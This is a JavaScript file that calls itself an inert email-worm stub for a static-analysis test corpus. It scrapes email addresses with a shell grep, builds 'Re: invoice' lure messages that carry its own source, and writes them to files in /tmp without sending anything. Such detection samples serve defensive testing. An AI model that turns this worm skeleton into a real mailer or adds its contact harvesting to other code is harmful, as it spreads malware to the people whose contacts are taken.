/**
 * INERT email-worm propagation stub — Zorro supply-chain / SAST corpus only.
 * No SMTP connection is made; patterns exist for static analysis only.
 */
const fs = require('fs')
const path = require('path')
const { execSync } = require('child_process')

const LAB = '/tmp/zorro-worm-lab/mail'

function harvestContacts() {
  // Simulated address-book scrape — should flag as credential/contact harvest
  const addrs = execSync('grep -r "@" ~/.zorro-lab-contacts 2>/dev/null || true', {
    encoding: 'utf8',
    shell: '/bin/bash',
  })
  return addrs.split('\n').filter(Boolean)
}

function buildPayload(recipient) {
  return {
    to: recipient,
    subject: 'Re: invoice',
    body: fs.readFileSync(__filename, 'utf8'),
    attachment: path.join(LAB, 'worm.js'),
  }
}

function massSend(contacts) {
  contacts.forEach((addr) => {
    const msg = buildPayload(addr)
    fs.writeFileSync(path.join(LAB, `${addr.replace('@', '_')}.json`), JSON.stringify(msg))
  })
}

massSend(harvestContacts())
